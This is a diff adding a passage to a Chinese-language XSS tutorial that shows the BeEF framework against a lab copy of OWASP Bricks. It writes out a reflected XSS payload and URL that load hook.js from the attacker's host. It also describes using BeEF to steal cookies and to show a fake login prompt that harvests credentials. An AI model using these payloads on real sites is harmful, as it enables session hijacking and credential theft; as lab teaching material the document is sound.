@@ -569,7 +569,57 @@ http://target_sys.com/xss/xss13.php?name=moon%27%20onmouseover=%27javascript:ale
 
 
 
-## 框架示例
+## BeEF框架示例
 
+在kali中启动`beef-xss`，下面是hook.js的脚本
 
+```
+http://10.4.7.7:3000/hook.js
+```
+
+打开OWASP TOP 10访问地址并进入相关网页
+
+```
+http://10.4.7.5/owaspbricks/content-2/index.php?user=harry
+```
+
+![](https://borinboy.oss-cn-shanghai.aliyuncs.com/xntz/20210823151228.png)
+
+payload
+
+```
+<script src=http://10.4.7.7:3000/hook.js></script>
+```
+
+完整的URL
+
+```
+http://10.4.7.5/owaspbricks/content-2/index.php?user=harry%3Cscript%20src=http://10.4.7.7:3000/hook.js%3E%3C/script%3E
+```
+
+按下回车之后，页面提示用户不存在
+
+![](https://borinboy.oss-cn-shanghai.aliyuncs.com/xntz/20210823151354.png)
+
+但是查看BeEF的页面可以看到，已经有结果了。
+
+![](https://borinboy.oss-cn-shanghai.aliyuncs.com/xntz/20210823151503.png)
+
+可以通过BeEF提供的各个功能模板攻击目标，可以看到在`Commands`下面提供了非常多的功能，比如Get All Cookies，见名知意，就是获取所有网站的Cookie信息。
+
+通过该工具我们可以构造一个弹出输入账号密码的提示框，所有参数配置完成之后，点击`execute`来执行。
+
+![](https://borinboy.oss-cn-shanghai.aliyuncs.com/xntz/20210823152913.png)
+
+执行完成之后回到存在漏洞的网页，看到多了一个弹框。
+
+![](https://borinboy.oss-cn-shanghai.aliyuncs.com/xntz/20210823153222.png)
+
+如果用户没有任何怀疑的输入账号密码，那么我们就能够获取到账号信息。
+
+![](https://borinboy.oss-cn-shanghai.aliyuncs.com/xntz/20210823153426.png)
+
+除了社工库以外，还有其他很多模块需要研究。
+
+可以看到，XSS攻击所造成的危害是十分巨大的，如果对方构造的是一个存储型或蠕虫攻击，那么所造成的影响便会成指数级增长。
 
